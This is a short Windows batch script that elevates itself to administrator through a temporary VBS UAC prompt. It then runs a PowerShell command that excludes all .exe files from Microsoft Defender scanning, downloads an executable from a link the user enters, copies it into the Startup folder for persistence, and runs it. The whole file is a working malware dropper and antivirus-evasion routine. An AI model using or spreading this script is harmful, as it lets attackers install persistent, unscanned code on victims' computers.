REM --add the following to the top of your bat file--


@echo off


:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
Powershell -Command "Set-MpPreference -ExclusionExtension exe"
set /p LINK="Enter your link: "
cd %TEMP%
Powershell -Command "Invoke-Webrequest %LINK% -OutFile mod.exe"  
Powershell -Command "Copy-Item -Path '%TEMP%\mod.exe' -Destination '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup' -PassThru"
mod.exe


